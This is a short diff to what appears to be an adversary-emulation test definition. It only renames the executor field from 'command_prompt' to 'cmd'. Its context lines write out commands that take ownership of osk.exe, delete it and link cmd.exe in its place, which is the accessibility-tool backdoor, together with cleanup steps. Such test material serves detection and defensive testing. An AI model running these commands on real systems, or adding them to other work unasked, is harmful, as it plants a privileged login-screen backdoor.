@@ -23,7 +23,7 @@ steps:
         icacls %windir%\System32\osk.exe /grant Administrators:F /t
         del %windir%\System32\osk.exe
         mklink %windir%\System32\osk.exe %windir%\System32\cmd.exe
-      executor: command_prompt
+      executor: cmd
       cleanup:
         inline: |
             takeown /F %windir%\System32\osk.exe /A
@@ -35,4 +35,4 @@ steps:
             icacls %windir%\System32\osk.exe /grant "NT SERVICE\TrustedInstaller":F /t
             icacls %windir%\system32\osk.exe /grant:r SYSTEM:RX
             icacls %windir%\system32\osk.exe /grant:r Administrators:RX
-        executor: command_prompt
+        executor: cmd
